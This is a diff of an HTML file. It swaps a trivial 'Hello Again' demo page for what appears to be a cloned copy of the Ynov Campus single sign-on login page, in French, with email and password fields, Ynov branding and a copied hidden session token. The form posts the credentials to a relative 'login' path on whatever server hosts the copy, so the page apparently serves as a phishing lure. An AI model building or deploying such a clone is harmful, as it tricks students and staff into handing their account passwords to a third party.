@@ -1,55 +1,85 @@
 <!DOCTYPE html>
 
 <head>
-    <title>My Website</title>
-    <style>
-        *,
-        html {
-            margin: 0;
-            padding: 0;
-            border: 0;
-        }
-
-        html {
-            width: 100%;
-            height: 100%;
-        }
-
-        body {
-            width: 100%;
-            height: 100%;
-            position: relative;
-            background-color: rgb(236, 152, 42);
-        }
-
-        .center {
-            width: 100%;
-            height: 50%;
-            margin: 0;
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-family: "Trebuchet MS", Helvetica, sans-serif;
-            text-align: center;
-        }
-
-        h1 {
-            font-size: 144px;
-        }
-
-        p {
-            font-size: 64px;
-        }
-    </style>
+    <title>Ynov - Connexion</title>
+    <meta charset="UTF-8"/><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/><link rel="stylesheet" href="/css/ynov.css?t=1566989994"/><link rel="icon" href="/favicon.ico" type="image/x-icon"/><script type="text/javascript" src="/webjars/jquery/3.3.1-1/jquery.min.js"></script>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" /><meta http-equiv="X-UA-Compatible" content="IE=edge"/><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"/>
+    <link rel="stylesheet" href="../asset/index.css">
 </head>
-
-<body>
-    <div class="center">
-        <h1>Hello Again!</h1>
-        <p>This is served from a file</p>
+<body class="login">
+    <header role="banner">
+</header>
+    <main role="main">
+        <div id="content">
+    <div class="box">
+        <div class="sidebar">
+            <div class="sidebar-content">
+                <p class="logo_container">
+                    <img class="logo" src="images/logo_ynov_campus_blanc.svg" /></p>
+                <h3 class="desktop-only">Bienvenue dans la communauté Ynov</h3>
+                <p class="desktop-only">
+                    Candidats, Etudiants, Professeurs et Entreprises : accédez aux outils et services Ynov Campus à l'aide de votre Compte Ynov !
+                </p>
+            </div>
+            <div class="sidebar-footer">
+                <p class="desktop-only">
+                    <a class="button" href="https://monprofil.ynov.com/register">Créer un compte</a>
+                </p>
+            </div>
+        </div>
+        <div class="main">
+            <form id="login" method="post" action="login">
+                <div class="main-title">
+                    <h1>Connexion</h1>
+                </div>
+                <div class="main-error">
+                    <p id="cookiesDisabled" class="warning" style="display: none;">
+                        <strong class="card-title">Cookies navigateur désactivés</strong>
+                        <span class="card-text">Votre navigateur ne supporte pas les cookies. L'authentification centralisée NE FONCTIONNERA PAS.</span>
+                    </p>
+                    </div>
+                <div class="main-content">
+                    <div class="form">
+                        <div class="field">
+                            <label for="username">E-mail : </label>
+                            <input id="username" type="email" tabindex="1" accesskey="i" autocomplete="off" name="username" value=""/></div>
+                        
+                        
+                        <div class="field">
+                            <label for="password">Mot de passe : </label>
+                            <input id="password" type="password" tabindex="2"  accesskey="m" autocomplete="off" name="password" value=""/><p id="capslock-on" class="field-warning" style="display:none;">
+                                <i class="material-icons">warning</i>
+                                <span>La touche Verr Maj est activée !</span>
+                            </p>
+                        </div>
+                        <input type="hidden" name="execution" value="4494c06f-d8f1-4b65-a2b6-ba3ae8829638_ZXlKaGJHY2lPaUpJVXpVeE1pSXNJblI1Y0NJNklrcFhWQ0o5Lnp0eXQ4MXlZSFBXd3BVeHFHeHNWYmZmN2c2NkZ0OXhnZGdnV29zZExoZzE4eTE5UWdSSlpnc2VxeHBpMEZBQjhrLzR3anpkNkhLZnhrd2JBT1VKWllsSGtxTFZBc1pSNWc4VVdzejkwUzdQcE9WYS9Wa2NMMFhYdFdLWjduVEJ1SFZQaGZDblZ2bWxzL2NrQU12T2paQjlFRE4waFRZc0hSU3BZSHRFWnZUQUR3c3V0NGJ0Qk5mTDYzQjR1eTE0bFl5SFRHWHh6MG90c21xTjRBdi9hdzhDVmR4M2hYMmFuMVRKRkVYc0ZWTXJxSGJCQlJQSzJpeFpaZllxaEtZRHRDMFN1VFZDVXc1MEpwSFErSDlQV08rcDJnaVRQRmJIWTFOTTJLcXFSRnd2SmpWQXY2U0lCZ0hGVHFodUZ3V093b25lcWI4MmQ2ZU0veVNUSU1LUGc1UzNpTTgwTzBJcTlzd08yWVFkY3Q0UWJkdTR4NW55V3ZQVk9XN21zUm0vdk4xRm1zY2hsOTc4M0pKS2x1YjV0MVhYc3J2N0NKSmcvQlNGN204SHpnaW83Ump0VFhIR1BHamg5L3FRVExrWGdxeVJUYytHVmR0YVVKV0VITXRQMlM1SGdCY3ZuVFpFdjhYcVFFK2Nnb2M3RlpGNXZOUHdPa1NubWZ4d21FNEtGcW5Zb0EyTVUyVXhYVklFYThGZmY0em5tZGRNeHJwSDFsekpyWTYvSXBVRUZUdndGL0ZwS2FVQXduemIzQTc5QzJBSmcxdGE5TWhoTEt5VWFUK2YyeC9zbnhQb0RLZ2tCNFMwZUZwTTBlcTR4SE5wL01iZGpZWEVOYWF3M25NeHIrTWJVRExBMllvd3B0L3pCOG5QTktoUDdFL2pZeTFadUo1Q2Y0alFlUFFFTXpGQ1JkQWp6dVJxMHhtS2diSjd2SEpxUGtTYjI1bkVEUGFOeUhWWStrYko2aG1PWFJxZ2ZIaGxUL3IwQVlaV0dFSmVmaWZOVUZMamJscEE3cjRSeGRCM2t3S1U2ZmtuK1ZSaFFGeGpRTUhQanIyMHpKZjRLaGNLTS83QUtNWW9DSFN4S0FxN2ViOGE0QXVQUWV5WFRnZldMWllsSUVzNXJMQjA2S1pOb3BtMVBlRzByNXVzbmNERnlyRWlRL3JTQmJIMnM3dDArVzF0Vyt1eGxwSHMzcjYwdFdVTndxaDgzWFpRRFB6MUc1R04rOHdUWEdzbitMTEp6OUNMM0phV3ZuZ0VoZmkzdVFOSElId25Pd2U2V0hyNWx2aE9CR3FNaVVOR2cvTkpoNjZOOUhUM0tZZGIzdXd2Z3VDbzJ4YllFS1h5T3NMQ0RWZ0xnYjZBdW1TRHNyNmtZQ0FGc0tWVVZFZmsvY0VqaXcrUTZRSjBybXBTTjhBWW9lUndiY0szMEZPVjZYZFdGRUNtY293cnA3SnBuV0pId2dpZTVqZHFEamJSRjN6dTRGOXFOWmlKQlQ1MXUwMSszQXN4ZDlBekJPbkN3UUgxTmJnc3dUbWpTRVBhVEhQRVJlVUpmci9HZE5mOGI3RGZlTmVObC9hSGNoVW94b01aV2tpYjFxYXVRdm9SOURoSEhIcGJGOUZpbG9RV2gwakJNVk9PTTJCblBXMjY2MTBpeHNSSFdZUHFrOC9VQXlwQzZJb2F2Rko0TFhIb0c4eUJTcWwySFU3L3VjOHVpOEFqRm05VG11OGljRXA3ejIxeVlTZGlsTlpQVENEeko5bDNTQ0xUQTEyRGhnWTJMeFJVL1FNYzJWRHBKb1FEeDQ5QU5EMDkwNjkybkdhOVA3L1YwTHVkYVBPZW8rRWpUcGp1c2gxWU1UeVhyTWs2SUVWdU5iN0pwTFRBall1K2s1M1B0RnZDUHZUZ3pSTjhhUmc1QnFPU3A0eUhmZ3RnUFVCMmR5Z3NEZGNrSGhHQnJ5cWlvTnFXa3Y4bFNJYWp5TWFBZ000Skh6ckQzeHRBSDBHWFNmYUtqVTVEclpnbkpUUjMyNk1vb040d0l2TGpLeG9jdm1ZeFVCR3p2T0JzZEVlblJxZXV6T0Y1N1lDQnFDRDVONUx1RUZ4dmhRRFJScFFqZmFzVHl6c1ZrTm0vaTkvTUhxVUVWWUQ3S3oxMDJXVTRUYkt1enhMRjdEMVROMlZCQXlyZk5zcmxGSTd3OGkxdE5KMExlcG5UN3pnMlg5TCt0VVQ3Z0VSZHpSUFlkbjVQL1h0Y1ZSdElKUlRKNCtNL2lySUV6cTZEUy9sU3R1TTMvM2gwRzUwQzBvVEoyN1NFbWdZSy82bTQyWDNWbEU2bkdmNlA4Zk04N2ZwaWZKZ21URGtiTXl3cmxLNWFaVzlteEZIQy9QOUVBUVJ5c00zUG96dXVDRWZuMVlKWEdwcXpFRmlFekJXU3R1OUJoVVNKajlZS2lNSWYxM0ZEcVRhYUpjdTA3YXpIYm9nVEZSWUZmK09lSndMdmRLazBQVDRxbmNuaVUrc3FsTlBJS0JjY2dqUEV1eFhWQ21lOG9WdndhYUEweENvRllqSDlMYi9KbDVyaGp4OGJhM3BwM25oaVFTUzFzemgwNzdtb052NEQxY0Vuc2J0UVNLc1lyUkg5S0g3YUticzc3dHFjUnU5SjVuMTVZa3FhdnhPVUlOeStaUCtQNUl5SHp5SjNUQnBDRDFrNWJjYmFzMjFEcjg0Rk5reG5yQ0FHdkNWVGVrblRaQlk3THlJU0JtMG4rWVJFNGFzYk1WcS9BbGNWUGVyK1Z0YkxHT1VjajZoN1pnNVZwazZIRmZGM000bHA3UkVMYmVDS3lEbnNvVC8raFRmRnBNRHBtZzE5VGVoZzQ3TmFLeU1STUtoYzluOHB6TEt6TzdSSHg0T0huYkpPcmF2NUwxRGdnYnB0emNqeDVWK2Y5M29aeHpYZWdYZDJWNER3S1Bnb24wNjlWREU3S05rcUNqNy9EYzZ3NVBBZmExSGR6aWRTY1Vmb2pvNnRBbi92RXFpRVhlek9mSmN5ditxS0FTYzdVajVZNkQ0OHE3TFN5UjYrMEJvZlRGSVd3S1owRVVHMWlJbjV1N0ZpQm5JNnpTdFo3QkFSTVN4S2g4Q25FL1ltRWtod2MyN1RrZEFKMkQzMG14NzlQa0Q2a3p4VVI2NlBlWGVXY1FyRDN6ekNEWms5aEsrQ2tCNCtXMzFRMENpbnFvczl2d2Y2YitBK1hkc0FnaldKdXdpb00vMW5FMmhYalZ3Zko4b2NzaXBFbFh2Tk5zMERWeHMvckd4TlU2eUhSdnR6R043SkNoRC9EVW9Rdml6emowT3JUbmY0S1IwZHF3SmhhUGNveDFPUElDSzFTVHlmZGFTbE5BbUVGMWUrdmJkL2lPZDdrSFlTK1N4MGdFRTg0ckxWVGZDamZPU2NHTGc3ZjNjV3JKZmhUaUVTNXFORStjYkkzL2xac2pvR1BaZVBzNkVvcWhkeS9uV01lQmJ0OFZxTjV3OEZLZGlzSkRHZUh6V2hvSTZrY3BWZXQ1N1VGUzFYTmdKNmowdmY4dlJVTTFtZXBXeVNBZEcwSGxDTmpiWEFXaTRRU3V5UkxMc2hJY1NKWm51ZlJDdlZ1YmxHUGJsVm96aFUvMEFBc05sdGtCL3pCakVjaGlxNnNGbFRFbXpHTnFuUkhXRkxGNWlsUE9VSUo5NDhlTm4rZ1BEY3VxWkRzbWIrM1NQSC9YdWtncWU3RjBmbnRrLzViTCtaRFRQTGc2MFgrSklrWlIwbTFSc3NtbXp6STNYSWxZalZpOEplSDI0UkthNWRNQmM3QVAvMFNUUTN6WXVPQTFvVHByaDQ0VThWeDFrZUloQ0xSeDZrZjVkWEtQZkpySy9TNjFJNXlXOE9kU0VvUktNbTZ1Umo1RFJPZzVBa2dmYU1XWkxtb1M3TEJONlBXMFFiYmROeWxPSmFPUk1UZEdkVmRpU2UydkNsTC85SHV1djFTZkdSS0VvUzVJaUZjVU44K3lzVUZ3ZXUrQnZoT3h3YVlaS1BsLjBNYzA2YllqMVJmRV9BM25zb2YtRjFqZTNDTElfbV8tUXFycS1ackdnVERFZFBEWHNtWkpVaGktMERVcTd5QmxKVTdwSWVlb3pxR25xbUtNcnotVFl3"/><input type="hidden" name="_eventId" value="submit"/><input type="hidden" name="geolocation"/><input name="submit" type="submit" class="button" tabindex="6" accesskey="l" value="Connexion" /></div>
+                    <ul>
+                        <li>
+                            <a href="https://monprofil.ynov.com/password">Mot de passe oublié</a>
+                        </li>
+                        <li class="mobile-only">
+                            <a href="https://monprofil.ynov.com/register">Créer un compte</a>
+                        </li>
+                    </ul>
+                </div>
+            </form>
+        </div>
     </div>
-</body>
+</div>
+    </main>
+    <footer class="footer" role="contentinfo">
+        <ul>
+            <li>
+                <a href="mailto:support@ynov.com">Support</a>
+            </li>
+            <li>
+                <a href="https://www.ynov.com/mentions-legales/">Mentions légales</a>
+            </li>
+            <li>
+                <a href="https://privacy.ynov.com">Données personnelles</a>
+            </li>
+        </ul>
+    </footer>
+</head>
 
 </html>
